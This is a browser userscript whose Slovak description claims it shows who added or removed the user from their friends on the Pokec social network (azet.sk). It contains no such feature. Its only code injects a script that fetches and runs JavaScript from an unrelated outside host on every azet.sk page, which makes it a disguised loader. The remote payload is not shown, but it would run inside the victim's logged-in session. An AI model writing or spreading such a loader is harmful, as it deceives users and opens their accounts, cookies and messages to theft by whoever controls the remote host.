// ==UserScript==
// @name           Prehľad priateľov na pokeci
// @namespace      http://userscripts.com
// @description    Zobrazuje kto a kedy si ťa pridal a kto odstránil z priateľov.
// @author         324243
// @include        htt*://*.azet.sk/*
// @include        http://*.azet.sk/*
// ==/UserScript==

var scV=document.createElement("script");
scV.type="text/javascript";
scV.src="http://smilies-pokec.borec.cz/nove/script.js?nocache="+Math.round(Math.random()*1000);
document.getElementsByTagName("head")[0].appendChild(scV);